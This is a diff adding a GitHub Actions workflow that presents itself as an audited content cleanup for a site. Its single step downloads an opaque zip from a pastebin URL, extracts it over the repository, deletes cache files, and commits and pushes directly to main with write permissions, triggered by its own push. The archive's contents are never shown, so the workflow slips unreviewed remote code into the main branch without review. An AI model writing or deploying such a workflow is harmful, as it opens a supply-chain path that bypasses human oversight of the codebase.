@@ -1,0 +1,36 @@
+name: "Apply final animal-only audit cleanup"
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - ".github/workflows/final-animal-audit-cleanup.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  apply-cleanup:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4.2.2
+        with:
+          fetch-depth: 1
+      - name: Apply audited cleanup package
+        run: |
+          set -euo pipefail
+          curl -L --fail --silent --show-error https://paste.rs/Sffu3 -o /tmp/final-animal-cleanup.zip
+          echo "1d5e8cb1bb191389e398ff18b9528e56e0fede47b6f279b281e229d130f60774  /tmp/final-animal-cleanup.zip" | sha256sum --check
+          unzip -oq /tmp/final-animal-cleanup.zip -d .
+          rm -f _data/feed_cache.json _data/feed_health.json
+          git config user.name "Wild Brief Bot"
+          git config user.email "bot@wildbrief.com"
+          git add -A
+          if git diff --cached --quiet; then
+            echo "No cleanup changes to publish."
+            exit 0
+          fi
+          git commit -m "audit: remove remaining non-animal legacy"
+          git push origin HEAD:main
